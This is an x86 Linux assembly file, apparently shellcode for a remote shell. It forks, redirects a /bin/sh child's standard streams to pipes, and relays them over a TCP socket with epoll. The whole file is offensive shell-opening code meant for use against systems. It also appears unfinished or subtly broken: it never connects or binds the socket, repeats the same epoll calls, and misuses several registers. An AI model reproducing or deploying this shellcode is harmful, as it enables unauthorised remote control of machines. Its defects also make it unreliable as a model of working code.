;
;  Copyright © 2017 Odzhan. All Rights Reserved.
;
;  Redistribution and use in source and binary forms, with or without
;  modification, are permitted provided that the following conditions are
;  met:
;
;  1. Redistributions of source code must retain the above copyright
;  notice, this list of conditions and the following disclaimer.
;
;  2. Redistributions in binary form must reproduce the above copyright
;  notice, this list of conditions and the following disclaimer in the
;  documentation and/or other materials provided with the distribution.
;
;  3. The name of the author may not be used to endorse or promote products
;  derived from this software without specific prior written permission.
;
;  THIS SOFTWARE IS PROVIDED BY AUTHORS "AS IS" AND ANY EXPRESS OR
;  IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
;  WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
;  DISCLAIMED. IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT,
;  INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES
;  (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
;  SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
;  HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT,
;  STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN
;  ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
;  POSSIBILITY OF SUCH DAMAGE.
;  

%define SYS_exit           0x001
%define SYS_fork           0x002 
%define SYS_read           0x003
%define SYS_write          0x004
%define SYS_close          0x006
%define SYS_execve         0x00B
%define SYS_kill           0x025
%define SYS_pipe           0x02A
%define SYS_dup2           0x03f
%define SYS_socketcall     0x066
%define SYS_epoll_ctl      0x0FF
%define SYS_epoll_wait     0x100
%define SYS_epoll_create1  0x149
%define SYS_shutdown       0x175


%define STDIN_FILENO    0
%define STDOUT_FILENO   1
%define STDERR_FILENO   2

%define EPOLLIN     0x001

%define EPOLL_CTL_ADD 1
%define EPOLL_CTL_DEL 2
%define EPOLL_CTL_MOD 3

%define SYS_SOCKET      1
%define SYS_BIND        2  
%define SYS_CONNECT     3 

%define SIGCHLD	20
%define BUFSIZ 256

%define SHUT_RDWR     1

struc epoll_event
  events resd 1
  data   resd 1
endstruc
         
struc sc_prop
  p_in  resd 2
  p_out resd 2
  s     resd 1
  pid   resd 1
  efd   resd 1
  len   resd 1
  evt   resd 1  
  evts  resd 1
  buf   resb BUFSIZ
  h     resd 1     
endstruc
      
         
    bits 32
    
start:    
      pushad
      sub    esp, sc_prop_size
      mov    ebp, esp
      
      ; pipe(in);
      lea    ebx, [ebp+p_in]
      mov    eax, SYS_pipe
      int    0x80
      
      ; pipe(out);
      lea    ebx, [ebp+p_out]
      mov    eax, SYS_pipe
      int    0x80
      
      ; pid = fork();
      mov    eax, SYS_fork
      int    0x80    
      mov    [ebp+pid], eax
      test   eax, eax
      jz     connect
      
      ; dup2(p.in[0], STDIN_FILENO);
      mov    ecx, STDIN_FILENO
      mov    ebx, [ebp+p_in]
      mov    eax, SYS_dup2
      int    0x80    
      
      ; dup2(p.out[1], STDOUT_FILENO);
      mov    ecx, STDOUT_FILENO    
      mov    ebx, [ebp+p_out+4]
      mov    eax, SYS_dup2      
      int    0x80      
      
      ; dup2(p.out[1], STDERR_FILENO);
      mov    ecx, STDERR_FILENO    
      mov    ebx, [ebp+p_out+4]
      mov    eax, SYS_dup2      
      int    0x80     
      
      ; close(p.in[0]);
      mov    eax, SYS_close
      mov    ebx, [ebp+p_in]    
      int    0x80   
      
      ; close(p.in[1]);
      mov    eax, SYS_close  
      mov    ebx, [ebp+p_in+4]    
      int    0x80    

      ; close(p.out[0]);
      mov    eax, SYS_close 
      mov    ebx, [ebp+p_out]    
      int    0x80    

      ; close(p.out[1]);    
      mov    eax, SYS_close
      mov    ebx, [ebp+p_out+4]    
      int    0x80       

      ; execve("/bin//sh", 0, 0);
      mov    eax, SYS_execve
      cdq
      xor    ecx, ecx
      push   ecx
      push   '//sh'
      push   '/bin'
      mov    ebx, esp
      int    0x80
connect:    
      ; close(p.in[0]);
      mov    eax, SYS_close
      mov    ebx, [ebp+p_in]    
      int    0x80    

      ; close(p.out[1]);
      mov    eax, SYS_close  
      mov    ebx, [ebp+p_out+4]    
      int    0x80   
      
      ; socket(AF_INET, SOCK_STREAM, IPPROTO_IP);    
      xor    ebx, ebx          ; ebx=0
      mul    ebx               ; eax=0, edx=0
      mov    al, SYS_socketcall
      inc    ebx               ; ebx      = sys_socket
      push   edx               ; protocol = IPPROTO_IP
      push   ebx               ; type     = SOCK_STREAM
      push   2                 ; family   = AF_INET
      mov    ecx, esp          ; ecx      = &args
      int    0x80
      mov    [ebp+s], eax

      ; efd = epoll_create1(0);
      mov    eax, SYS_epoll_create1
      xor    ebx, ebx
      int    0x80
      mov    [ebp+efd], eax
      
      test   eax, eax
      jle    shutdown
poll_init:
      ; epoll_ctl(efd, EPOLL_CTL_ADD, h[i], &evts[0]); 
      mov    eax, SYS_epoll_ctl
      mov    ebx, [ebp+efd]
      mov    ecx, EPOLL_CTL_ADD
      mov    edx, [ebp+s]
      lea    esi, [ebp+evt]
      int    0x80 

      ; epoll_ctl(efd, EPOLL_CTL_ADD, h[i], &evts[0]);      
      mov    eax, SYS_epoll_ctl
      mov    ebx, [ebp+efd]
      mov    ecx, EPOLL_CTL_ADD
      mov    edx, [ebp+s]
      lea    esi, [ebp+evt]
      int    0x80       
poll_wait:
      ; epoll_wait(efd, evts, 1, -1);
      mov    eax, SYS_epoll_wait
      mov    ebx, [ebp+efd]
      lea    ecx, [ebp+evts]
      mov    edx, 1
      or     esi, -1
      int    0x80
      
      ; if (r <= 0) break;
      test   eax, eax
      jle    close_efd
      
      ; if (!(evt & EPOLLIN)) break;
      test   eax, EPOLLIN
      jnz    close_efd
      
      ; if (fd == s)
      cmp    eax, [ebp+s]
      jne    read_stdout
      
      ; len = read(s, buf, BUFSIZ);
      mov    eax, SYS_read
      mov    ebx, [ebp+s]
      lea    ecx, [ebp+buf]
      mov    edx, BUFSIZ
      int    0x80      
      mov    [ebp+len], eax
      
      ; write(in[1], buf, len);
      mov    eax, SYS_write
      mov    ebx, [ebp+p_in+4]
      mov    ecx, [ebp+len]
      int    0x80
      jmp    poll_wait      
read_stdout:
      ; len = read(out[0], buf, BUFSIZ);
      mov    eax, SYS_read
      mov    ebx, [ebp+p_out]
      lea    ecx, [ebp+buf]
      mov    edx, BUFSIZ
      int    0x80      
      mov    [ebp+len], eax
      
      ; write(s, buf, len);
      mov    eax, SYS_write
      mov    ebx, [ebp+s]
      mov    ecx, [ebp+len]
      int    0x80
      jmp    poll_wait
close_efd:
      ; epoll_ctl(efd, EPOLL_CTL_DEL, h[i], NULL);
      mov    eax, SYS_epoll_ctl
      mov    ebx, [ebp+efd]
      mov    ecx, EPOLL_CTL_DEL
      mov    edx, [ebp+h]
      xor    esi, esi
      int    0x80  

      ; epoll_ctl(efd, EPOLL_CTL_DEL, h[i], NULL);      
      mov    eax, SYS_epoll_ctl
      mov    ebx, [ebp+efd]
      mov    ecx, EPOLL_CTL_DEL
      mov    edx, [ebp+h]
      xor    esi, esi
      int    0x80       
shutdown:
      ; kill(pid, SIGCHLD);
      mov    eax, SYS_kill
      mov    ebx, [ebp+pid]
      mov    ecx, SIGCHLD
      int    0x80

      ; shutdown(s, SHUT_RDWR);
      mov    eax, SYS_shutdown
      mov    ebx, [ebp+s]
      mov    ecx, SHUT_RDWR
      int    0x80

      ; close(s);
      mov    eax, SYS_close
      mov    ebx, [ebp+s]
      int    0x80
close_pipes:
      ; close(in[1]);
      mov    ebx, [ebp+p_in+4]
      mov    eax, SYS_close
      int    0x80

      ; close(out[0]);    
      mov    ebx, [ebp+p_out]
      mov    eax, SYS_close
      int    0x80    
exit:
      ; exit(0);
      mov    eax, SYS_exit
      int    0x80    
      
      add    esp, sc_prop_size
      popad
      ret    
      
%include "mx.asm"
%include "rnx.asm"
%include "cpx.asm"
      